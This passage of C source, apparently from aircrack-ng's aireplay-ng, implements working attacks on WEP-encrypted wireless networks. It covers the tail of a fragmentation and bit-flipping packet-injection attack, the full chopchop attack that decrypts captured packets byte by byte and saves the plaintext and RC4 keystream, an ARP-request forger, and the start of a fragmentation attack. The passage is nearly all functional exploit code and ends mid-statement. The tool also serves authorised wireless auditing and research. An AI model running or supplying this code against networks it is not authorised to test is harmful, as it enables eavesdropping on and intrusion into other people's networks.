memset(clear, 0, 4096);\n    memset(final, 0, 4096);\n    memset(flip, 0, 4096);\n    memset(frag1, 0, 128);\n    memset(frag2, 0, 128);\n    memset(frag3, 0, 128);\n    memset(keystream, 0, 128);\n\n    /* check if it's a potential ARP request */\n\n    //its length 68-24 or 86-24 and going to broadcast or a unicast mac (even first byte)\n    if( (caplen-z == 68-24 || caplen-z == 86-24) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )\n    {\n        /* process ARP */\n        printf(\"Found ARP packet\\n\");\n        isarp = 1;\n        //build the new packet\n        set_clear_arp(clear, smac, dmac);\n        set_final_arp(final, opt.r_smac);\n\n        for(i=0; i<14; i++)\n            keystream[i] = (h80211+z+4)[i] ^ clear[i];\n\n        // correct 80211 header\n//         h80211[0] = 0x08;    //data\n        if( (h80211[1] & 3) == 0x00 ) //ad-hoc\n        {\n            h80211[1] = 0x40;    //wep\n            memcpy(h80211+4, smac, 6);\n            memcpy(h80211+10, opt.r_smac, 6);\n            memcpy(h80211+16, bssid, 6);\n        }\n        else //tods\n        {\n            if(opt.f_tods == 1)\n            {\n                h80211[1] = 0x41;    //wep+ToDS\n                memcpy(h80211+4 , bssid, 6);\n                memcpy(h80211+10, opt.r_smac, 6);\n                memcpy(h80211+16, smac, 6);\n            }\n            else\n            {\n                h80211[1] = 0x42;    //wep+FromDS\n                memcpy(h80211+4, smac, 6);\n                memcpy(h80211+10, bssid, 6);\n                memcpy(h80211+16, opt.r_smac, 6);\n            }\n        }\n        h80211[22] = 0xD0; //frag = 0;\n        h80211[23] = 0x50;\n\n        //need to shift by 10 bytes; (add 1 frag in front)\n        memcpy(frag1, h80211, z+4); //copy 80211 header and IV\n        frag1[1] |= 0x04; //more frags\n        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);\n        frag1[z+4+8] = 0x00;\n        frag1[z+4+9] = 0x01; //ethernet\n        add_crc32(frag1+z+4, 10);\n        for(i=0; i<14; i++)\n            (frag1+z+4)[i] ^= keystream[i];\n        /* frag1 finished */\n\n        for(i=0; i<caplen; i++)\n            flip[i] = clear[i] ^ final[i];\n\n        add_crc32_plain(flip, caplen-z-4-4);\n\n        for(i=0; i<caplen-z-4; i++)\n            (h80211+z+4)[i] ^= flip[i];\n        h80211[22] = 0xD1; // frag = 1;\n\n        //ready to send frag1 / len=z+4+10+4 and h80211 / len = caplen\n    }\n    else\n    {\n        /* process IP */\n        printf(\"Found IP packet\\n\");\n        isarp = 0;\n        //build the new packet\n        set_clear_ip(clear, caplen-z-4-8-4); //caplen - ieee80211header - IVIDX - LLC/SNAP - ICV\n        set_final_ip(final, opt.r_smac);\n\n        for(i=0; i<8; i++)\n            keystream[i] = (h80211+z+4)[i] ^ clear[i];\n\n        // correct 80211 header\n//         h80211[0] = 0x08;    //data\n        if( (h80211[1] & 3) == 0x00 ) //ad-hoc\n        {\n            h80211[1] = 0x40;    //wep\n            memcpy(h80211+4, smac, 6);\n            memcpy(h80211+10, opt.r_smac, 6);\n            memcpy(h80211+16, bssid, 6);\n        }\n        else\n        {\n            if(opt.f_tods == 1)\n            {\n                h80211[1] = 0x41;    //wep+ToDS\n                memcpy(h80211+4 , bssid, 6);\n                memcpy(h80211+10, opt.r_smac, 6);\n                memcpy(h80211+16, smac, 6);\n            }\n            else\n            {\n                h80211[1] = 0x42;    //wep+FromDS\n                memcpy(h80211+4, smac, 6);\n                memcpy(h80211+10, bssid, 6);\n                memcpy(h80211+16, opt.r_smac, 6);\n            }\n        }\n        h80211[22] = 0xD0; //frag = 0;\n        h80211[23] = 0x50;\n\n        //need to shift by 12 bytes;(add 3 frags in front)\n        memcpy(frag1, h80211, z+4); //copy 80211 header and IV\n        memcpy(frag2, h80211, z+4); //copy 80211 header and IV\n        memcpy(frag3, h80211, z+4); //copy 80211 header and IV\n        frag1[1] |= 0x04; //more frags\n        frag2[1] |= 0x04; //more frags\n        frag3[1] |= 0x04; //more frags\n\n        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);\n        add_crc32(frag1+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag1+z+4)[i] ^= keystream[i];\n\n        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);\n        add_crc32(frag2+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag2+z+4)[i] ^= keystream[i];\n        frag2[22] = 0xD1; //frag = 1;\n\n        frag3[z+4+0] = 0x00;\n        frag3[z+4+1] = 0x01; //ether\n        frag3[z+4+2] = 0x08; //IP\n        frag3[z+4+3] = 0x00;\n        add_crc32(frag3+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag3+z+4)[i] ^= keystream[i];\n        frag3[22] = 0xD2; //frag = 2;\n        /* frag1,2,3 finished */\n\n        for(i=0; i<caplen; i++)\n            flip[i] = clear[i] ^ final[i];\n\n        add_crc32_plain(flip, caplen-z-4-4);\n\n        for(i=0; i<caplen-z-4; i++)\n            (h80211+z+4)[i] ^= flip[i];\n        h80211[22] = 0xD3; // frag = 3;\n\n        //ready to send frag1,2,3 / len=z+4+4+4 and h80211 / len = caplen\n    }\n\n\n    /* loop resending the packet */\n\n\t/* Check if airodump-ng is running. If not, print that message */\n    printf( \"You should also start airodump-ng to capture replies.\\n\\n\" );\n\n    signal( SIGINT, sighandler );\n    ctrl_c = 0;\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_sent = 0;\n\n    while( 1 )\n    {\n        if( ctrl_c )\n            goto read_packets;\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %ld packets...(%d pps)\\33[K\\r\", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )\n            continue;\n\n        /* threshold reached */\n\n        ticks[2] = 0;\n\n        if( nb_pkt_sent == 0 )\n            ticks[0] = 0;\n\n        if(isarp)\n        {\n            if( send_packet( frag1, z+4+10+4 ) < 0 )\n                return( 1 );\n            nb_pkt_sent--;\n        }\n        else\n        {\n            if( send_packet( frag1, z+4+4+4 ) < 0 )\n                return( 1 );\n            if( send_packet( frag2, z+4+4+4 ) < 0 )\n                return( 1 );\n            if( send_packet( frag3, z+4+4+4 ) < 0 )\n                return( 1 );\n            nb_pkt_sent-=3;\n        }\n        if( send_packet( h80211, caplen ) < 0 )\n            return( 1 );\n    }\n\n    return( 0 );\n}\n\nint do_attack_chopchop( void )\n{\n    float f, ticks[4];\n    int i, j, n, z, caplen, srcz;\n    int data_start, data_end, srcdiff, diff;\n    int guess, is_deauth_mode;\n    int nb_bad_pkt;\n    int tried_header_rec=0;\n\n    unsigned char b1 = 0xAA;\n    unsigned char b2 = 0xAA;\n\n    FILE *f_cap_out;\n    long nb_pkt_read;\n    unsigned long crc_mask;\n    unsigned char *chopped;\n\n    unsigned char packet[4096];\n\n    time_t tt;\n    struct tm *lt;\n    struct timeval tv;\n    struct timeval tv2;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n\n\n    if(getnet(NULL, 1, 0) != 0)\n        return 1;\n\n    srand( time( NULL ) );\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n    srcz = z;\n\n    if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )\n        return( 1 );\n\n    if( opt.r_smac_set == 1 )\n    {\n        //handle picky APs (send one valid packet before all the invalid ones)\n        memset(packet, 0, sizeof(packet));\n\n        memcpy( packet, NULL_DATA, 24 );\n        memcpy( packet +  4, \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\", 6 );\n        memcpy( packet + 10, opt.r_smac,  6 );\n        memcpy( packet + 16, opt.f_bssid, 6 );\n\n        packet[0] = 0x08; //make it a data packet\n        packet[1] = 0x41; //set encryption and ToDS=1\n\n        memcpy( packet+24, h80211+z, caplen-z);\n\n        if( send_packet( packet, caplen-z+24 ) != 0 )\n            return( 1 );\n        //done sending a correct packet\n    }\n\n    /* Special handling for spanning-tree packets */\n    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||\n        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )\n    {\n        b1 = 0x42; b2 = 0x42;\n    }\n\n    printf( \"\\n\" );\n\n    /* chopchop operation mode: truncate and decrypt the packet */\n    /* we assume the plaintext starts with  AA AA 03 00 00 00   */\n    /* (42 42 03 00 00 00 for spanning-tree packets)            */\n\n    memcpy( srcbuf, h80211, caplen );\n\n    /* setup the chopping buffer */\n\n    n = caplen - z + 24;\n\n    if( ( chopped = (unsigned char *) malloc( n ) ) == NULL )\n    {\n        perror( \"malloc failed\" );\n        return( 1 );\n    }\n\n    memset( chopped, 0, n );\n\n    data_start = 24 + 4;\n    data_end   = n;\n    srcdiff = z-24;\n\n    chopped[0] = 0x08;  /* normal data frame */\n    chopped[1] = 0x41;  /* WEP = 1, ToDS = 1 */\n\n    /* copy the duration */\n\n    memcpy( chopped + 2, h80211 + 2, 2 );\n\n    /* copy the BSSID */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: memcpy( chopped + 4, h80211 + 16, 6 ); break;\n        case  1: memcpy( chopped + 4, h80211 +  4, 6 ); break;\n        case  2: memcpy( chopped + 4, h80211 + 10, 6 ); break;\n        default: memcpy( chopped + 4, h80211 + 10, 6 ); break;\n    }\n\n    /* copy the WEP IV */\n\n    memcpy( chopped + 24, h80211 + z, 4 );\n\n    /* setup the xor mask to hide the original data */\n\n    crc_mask = 0;\n\n    for( i = data_start; i < data_end - 4; i++ )\n    {\n        switch( i - data_start )\n        {\n            case  0: chopped[i] = b1 ^ 0xE0; break;\n            case  1: chopped[i] = b2 ^ 0xE0; break;\n            case  2: chopped[i] = 0x03 ^ 0x03; break;\n            default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;\n        }\n\n        crc_mask = crc_tbl[crc_mask & 0xFF]\n                 ^ ( crc_mask   >>  8 )\n                 ^ ( chopped[i] << 24 );\n    }\n\n    for( i = 0; i < 4; i++ )\n        crc_mask = crc_tbl[crc_mask & 0xFF]\n                 ^ ( crc_mask >> 8 );\n\n    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;\n\n    for( i = data_start; i < data_end; i++ )\n        chopped[i] ^= srcbuf[i+srcdiff];\n\n    data_start += 6; /* skip the SNAP header */\n\n    /* if the replay source mac is unspecified, forge one */\n\n    if( opt.r_smac_set == 0 )\n    {\n        is_deauth_mode = 1;\n\n        opt.r_smac[0] = 0x00;\n        opt.r_smac[1] = rand() & 0x3E;\n        opt.r_smac[2] = rand() & 0xFF;\n        opt.r_smac[3] = rand() & 0xFF;\n        opt.r_smac[4] = rand() & 0xFF;\n\n        memcpy( opt.r_dmac, \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\", 6 );\n    }\n    else\n    {\n        is_deauth_mode = 0;\n\n        opt.r_dmac[0] = 0xFF;\n        opt.r_dmac[1] = rand() & 0xFE;\n        opt.r_dmac[2] = rand() & 0xFF;\n        opt.r_dmac[3] = rand() & 0xFF;\n        opt.r_dmac[4] = rand() & 0xFF;\n    }\n\n    /* let's go chopping */\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_read = 0;\n    nb_pkt_sent = 0;\n    nb_bad_pkt  = 0;\n    guess       = 256;\n\n    tt = time( NULL );\n\n    alarm( 30 );\n\n    signal( SIGALRM, sighandler );\n\n    if(opt.port_in <= 0)\n    {\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    while( data_end > data_start )\n    {\n        if( alarmed )\n        {\n            printf( \"\\n\\n\"\n\"The chopchop attack appears to have failed. Possible reasons:\\n\"\n\"\\n\"\n\"    * You're trying to inject with an unsupported chipset (Centrino?).\\n\"\n\"    * The driver source wasn't properly patched for injection support.\\n\"\n\"    * You are too far from the AP. Get closer or reduce the send rate.\\n\"\n\"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\\n\"\n\"    * The wireless interface isn't setup on the correct channel.\\n\" );\n            if( is_deauth_mode )\n                printf(\n\"    * The AP isn't vulnerable when operating in non-authenticated mode.\\n\"\n\"      Run aireplay-ng in authenticated mode instead (-h option).\\n\\n\" );\n            else\n                printf(\n\"    * The client MAC you have specified is not currently authenticated.\\n\"\n\"      Try running another aireplay-ng to fake authentication (attack \\\"-1\\\").\\n\"\n\"    * The AP isn't vulnerable when operating in authenticated mode.\\n\"\n\"      Try aireplay-ng in non-authenticated mode instead (no -h option).\\n\\n\" );\n            return( 1 );\n        }\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"\\nread(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;  /* ticks since we entered the while loop     */\n            ticks[1]++;  /* ticks since the last status line update   */\n            ticks[2]++;  /* ticks since the last frame was sent       */\n            ticks[3]++;  /* ticks since started chopping current byte */\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 976 );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / 976;\n            ticks[1] += f / 976;\n            ticks[2] += f / 976;\n            ticks[3] += f / 976;\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %3ld packets, current guess: %02X...\\33[K\",\n                    nb_pkt_sent, guess );\n            fflush( stdout );\n        }\n\n        if( data_end < 41 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /\n                                (int) ( caplen - ( data_end - 1 ) ) )\n        {\n            header_rec:\n\n            printf( \"\\n\\nThe AP appears to drop packets shorter \"\n                    \"than %d bytes.\\n\",data_end );\n\n            data_end = 40;\n\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            diff = z-24;\n\n            if( ( chopped[data_end + 0] ^ srcbuf[data_end + srcdiff + 0] ) == 0x06 &&\n                ( chopped[data_end + 1] ^ srcbuf[data_end + srcdiff + 1] ) == 0x04 &&\n                ( chopped[data_end + 2] ^ srcbuf[data_end + srcdiff + 2] ) == 0x00 )\n            {\n                printf( \"Enabling standard workaround: \"\n                        \"ARP header re-creation.\\n\" );\n\n                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;\n                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x06;\n                chopped[24 + 12] = srcbuf[srcz + 12] ^ 0x00;\n                chopped[24 + 13] = srcbuf[srcz + 13] ^ 0x01;\n                chopped[24 + 14] = srcbuf[srcz + 14] ^ 0x08;\n                chopped[24 + 15] = srcbuf[srcz + 15] ^ 0x00;\n            }\n            else\n            {\n                printf( \"Enabling standard workaround: \"\n                        \" IP header re-creation.\\n\" );\n\n                n = caplen - ( z + 16 );\n\n                chopped[24 +  4] = srcbuf[srcz +  4] ^ 0xAA;\n                chopped[24 +  5] = srcbuf[srcz +  5] ^ 0xAA;\n                chopped[24 +  6] = srcbuf[srcz +  6] ^ 0x03;\n                chopped[24 +  7] = srcbuf[srcz +  7] ^ 0x00;\n                chopped[24 +  8] = srcbuf[srcz +  8] ^ 0x00;\n                chopped[24 +  9] = srcbuf[srcz +  9] ^ 0x00;\n                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;\n                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x00;\n                chopped[24 + 14] = srcbuf[srcz + 14] ^ ( n >> 8 );\n                chopped[24 + 15] = srcbuf[srcz + 15] ^ ( n & 0xFF );\n\n                memcpy( h80211, srcbuf, caplen );\n\n                for( i = z + 4; i < (int) caplen; i++ )\n                    h80211[i - 4] = h80211[i] ^ chopped[i-diff];\n\n                /* sometimes the header length or the tos field vary */\n\n                for( i = 0; i < 16; i++ )\n                {\n                    h80211[z +  8] = 0x40 + i;\n                    chopped[24 + 12] = srcbuf[srcz + 12] ^ ( 0x40 + i );\n\n                    for( j = 0; j < 256; j++ )\n                    {\n                        h80211[z +  9] = j;\n                        chopped[24 + 13] = srcbuf[srcz + 13] ^ j;\n\n                        if( check_crc_buf( h80211 + z, caplen - z - 8 ) )\n                            goto have_crc_match;\n                    }\n                }\n\n                printf( \"This doesn't look like an IP packet, \"\n                        \"try another one.\\n\" );\n            }\n\n        have_crc_match:\n            break;\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* send one modified frame */\n\n            ticks[2] = 0;\n\n            memcpy( h80211, chopped, data_end - 1 );\n\n            /* note: guess 256 is special, it tests if the  *\n             * AP properly drops frames with an invalid ICV *\n             * so this guess always has its bit 8 set to 0  */\n\n            if( is_deauth_mode )\n            {\n                opt.r_smac[1] |= ( guess < 256 );\n                opt.r_smac[5]  = guess & 0xFF;\n            }\n            else\n            {\n                opt.r_dmac[1] |= ( guess < 256 );\n                opt.r_dmac[5]  = guess & 0xFF;\n            }\n\n            memcpy( h80211 + 10, opt.r_smac,  6 );\n            memcpy( h80211 + 16, opt.r_dmac,  6 );\n\n            if( guess < 256 )\n            {\n                h80211[data_end - 2] ^= crc_chop_tbl[guess][3];\n                h80211[data_end - 3] ^= crc_chop_tbl[guess][2];\n                h80211[data_end - 4] ^= crc_chop_tbl[guess][1];\n                h80211[data_end - 5] ^= crc_chop_tbl[guess][0];\n            }\n\n            errno = 0;\n\n            if( send_packet( h80211, data_end -1 ) != 0 )\n                return( 1 );\n\n            if( errno != EAGAIN )\n            {\n                guess++;\n\n                if( guess > 256 )\n                    guess = 0;\n            }\n        }\n\n        /* watch for a response from the AP */\n\n        n = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        if( n  < 0 ) return( 1 );\n        if( n == 0 ) continue;\n\n        nb_pkt_read++;\n\n        /* check if it's a deauth packet */\n\n        if( h80211[0] == 0xA0 || h80211[0] == 0xC0 )\n        {\n            if( memcmp( h80211 + 4, opt.r_smac, 6 ) == 0 &&\n                ! is_deauth_mode )\n            {\n                nb_bad_pkt++;\n\n                if( nb_bad_pkt > 256 )\n                {\n                    printf(\"\\rgot several deauthentication packets - pausing 3 seconds for reconnection\\n\");\n                    sleep(3);\n                    nb_bad_pkt = 0;\n                }\n\n                continue;\n            }\n\n            if( h80211[4] != opt.r_smac[0] ) continue;\n            if( h80211[6] != opt.r_smac[2] ) continue;\n            if( h80211[7] != opt.r_smac[3] ) continue;\n            if( h80211[8] != opt.r_smac[4] ) continue;\n\n            if( ( h80211[5]     & 0xFE ) !=\n                ( opt.r_smac[1] & 0xFE ) ) continue;\n\n            if( ! ( h80211[5] & 1 ) )\n            {\n            \tif( data_end < 41 ) goto header_rec;\n\n                printf( \"\\n\\nFailure: the access point does not properly \"\n                        \"discard frames with an\\ninvalid ICV - try running \"\n                        \"aireplay-ng in authenticated mode (-h) instead.\\n\\n\" );\n                return( 1 );\n            }\n        }\n        else\n        {\n            if( is_deauth_mode )\n                continue;\n\n            /* check if it's a WEP data packet */\n\n            if( ( h80211[0] & 0x0C ) != 8 ) continue;\n            if( ( h80211[0] & 0x70 ) != 0 ) continue;\n            if( ( h80211[1] & 0x03 ) != 2 ) continue;\n            if( ( h80211[1] & 0x40 ) == 0 ) continue;\n\n            /* check the extended IV (TKIP) flag */\n\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            if( ( h80211[z + 3] & 0x20 ) != 0 ) continue;\n\n            /* check the destination address */\n\n            if( h80211[4] != opt.r_dmac[0] ) continue;\n            if( h80211[6] != opt.r_dmac[2] ) continue;\n            if( h80211[7] != opt.r_dmac[3] ) continue;\n            if( h80211[8] != opt.r_dmac[4] ) continue;\n\n            if( ( h80211[5]     & 0xFE ) !=\n                ( opt.r_dmac[1] & 0xFE ) ) continue;\n\n            if( ! ( h80211[5] & 1 ) )\n            {\n            \tif( data_end < 41 ) goto header_rec;\n\n                printf( \"\\n\\nFailure: the access point does not properly \"\n                        \"discard frames with an\\ninvalid ICV - try running \"\n                        \"aireplay-ng in non-authenticated mode instead.\\n\\n\" );\n                return( 1 );\n            }\n        }\n\n        /* we have a winner */\n\n        guess = h80211[9];\n\n        chopped[data_end - 1] ^= guess;\n        chopped[data_end - 2] ^= crc_chop_tbl[guess][3];\n        chopped[data_end - 3] ^= crc_chop_tbl[guess][2];\n        chopped[data_end - 4] ^= crc_chop_tbl[guess][1];\n        chopped[data_end - 5] ^= crc_chop_tbl[guess][0];\n\n        n = caplen - data_start;\n\n        printf( \"\\rOffset %4d (%2d%% done) | xor = %02X | pt = %02X | \"\n                \"%4ld frames written in %5.0fms\\n\", data_end - 1,\n                100 * ( caplen - data_end ) / n,\n                chopped[data_end - 1],\n                chopped[data_end - 1] ^ srcbuf[data_end + srcdiff - 1],\n                nb_pkt_sent, ticks[3] );\n\n        if( is_deauth_mode )\n        {\n            opt.r_smac[1] = rand() & 0x3E;\n            opt.r_smac[2] = rand() & 0xFF;\n            opt.r_smac[3] = rand() & 0xFF;\n            opt.r_smac[4] = rand() & 0xFF;\n        }\n        else\n        {\n            opt.r_dmac[1] = rand() & 0xFE;\n            opt.r_dmac[2] = rand() & 0xFF;\n            opt.r_dmac[3] = rand() & 0xFF;\n            opt.r_dmac[4] = rand() & 0xFF;\n        }\n\n        ticks[3]        = 0;\n        nb_pkt_sent     = 0;\n        nb_bad_pkt      = 0;\n        guess           = 256;\n\n        data_end--;\n\n        alarm( 0 );\n    }\n\n    /* reveal the plaintext (chopped contains the prga) */\n\n    memcpy( h80211, srcbuf, caplen );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n    diff = z-24;\n\n    chopped[24 + 4] = srcbuf[srcz + 4] ^ b1;\n    chopped[24 + 5] = srcbuf[srcz + 5] ^ b2;\n    chopped[24 + 6] = srcbuf[srcz + 6] ^ 0x03;\n    chopped[24 + 7] = srcbuf[srcz + 7] ^ 0x00;\n    chopped[24 + 8] = srcbuf[srcz + 8] ^ 0x00;\n    chopped[24 + 9] = srcbuf[srcz + 9] ^ 0x00;\n\n    for( i = z + 4; i < (int) caplen; i++ )\n        h80211[i - 4] = h80211[i] ^ chopped[i-diff];\n\n    if( ! check_crc_buf( h80211 + z, caplen - z - 8 ) ) {\n        if (!tried_header_rec) {\n            printf( \"\\nWarning: ICV checksum verification FAILED! Trying workaround.\\n\" );\n            tried_header_rec=1;\n            goto header_rec;\n        } else {\n            printf( \"\\nWorkaround couldn't fix ICV checksum.\\nPacket is most likely invalid/useless\\nTry another one.\\n\" );\n        }\n    }\n\n    caplen -= 4 + 4; /* remove the WEP IV & CRC (ICV) */\n\n    h80211[1] &= 0xBF;   /* remove the WEP bit, too */\n\n    /* save the decrypted packet */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    pkh.tv_sec  = tv.tv_sec;\n    pkh.tv_usec = tv.tv_usec;\n    pkh.caplen  = caplen;\n    pkh.len     = caplen;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_dec-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"\\nSaving plaintext in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    n = sizeof( pkh );\n\n    if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    n = pkh.caplen;\n\n    if( fwrite( h80211, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    fclose( f_cap_out );\n\n    /* save the RC4 stream (xor mask) */\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_dec-%02d%02d-%02d%02d%02d.xor\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving keystream in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = pkh.caplen + 8 - 24;\n\n    if( fwrite( chopped + 24, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\" );\n        return( 1 );\n    }\n\n    fclose( f_cap_out );\n\n    printf( \"\\nCompleted in %lds (%0.2f bytes/s)\\n\\n\",\n            (long) time( NULL ) - tt,\n            (float) ( pkh.caplen - 6 - 24 ) /\n            (float) ( time( NULL ) - tt  ) );\n\n    return( 0 );\n}\n\nint make_arp_request(unsigned char *h80211, unsigned char *bssid, unsigned char *src_mac, unsigned char *dst_mac, unsigned char *src_ip, unsigned char *dst_ip, int size)\n{\n\tunsigned char *arp_header = (unsigned char*)\"\\xaa\\xaa\\x03\\x00\\x00\\x00\\x08\\x06\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x01\";\n\tunsigned char *header80211 = (unsigned char*)\"\\x08\\x41\\x95\\x00\";\n\n    // 802.11 part\n    memcpy(h80211,    header80211, 4);\n    memcpy(h80211+4,  bssid,       6);\n    memcpy(h80211+10, src_mac,     6);\n    memcpy(h80211+16, dst_mac,     6);\n    h80211[22] = '\\x00';\n    h80211[23] = '\\x00';\n\n    // ARP part\n    memcpy(h80211+24, arp_header, 16);\n    memcpy(h80211+40, src_mac,     6);\n    memcpy(h80211+46, src_ip,      4);\n    memset(h80211+50, '\\x00',      6);\n    memcpy(h80211+56, dst_ip,      4);\n\n    // Insert padding bytes\n    memset(h80211+60, '\\x00', size-60);\n\n    return 0;\n}\n\nvoid save_prga(char *filename, unsigned char *iv, unsigned char *prga, int prgalen)\n{\n    FILE *xorfile;\n    size_t unused;\n    xorfile = fopen(filename, \"wb\");\n    unused = fwrite (iv, 1, 4, xorfile);\n    unused = fwrite (prga, 1, prgalen, xorfile);\n    fclose (xorfile);\n}\n\nint do_attack_fragment()\n{\n    unsigned char packet[4096];\n    unsigned char packet2[4096];\n    unsigned char prga[4096];\n    unsigned char iv[4];\n\n//    unsigned char ack[14] = \"\\xd4\";\n\n    char strbuf[256];\n\n    struct tm *lt;\n    struct timeval tv, tv2;\n\n    int done;\n    int caplen;\n    int caplen2;\n    int arplen;\n    int round;\n    int prga_len;\n    int isrelay;\n    int again;\n    int length;\n    int ret;\n    int gotit;\n    int acksgot;\n    int packets;\n    int z;\n\n    unsigned char *snap_header = (unsigned char*)\"\\xAA\\xAA\\x03\\x00\\x00\\x00\\x08\\x00\";\n\n    done = caplen = caplen2 = arplen = round = 0;\n    prga_len = isrelay = gotit = again = length = 0;\n\n    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )\n    {\n        memset( opt.r_dmac, '\\xFF', 6);\n        opt.r_dmac[5] = 0xED;\n    }\n\n    if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )\n    {\n        memset( 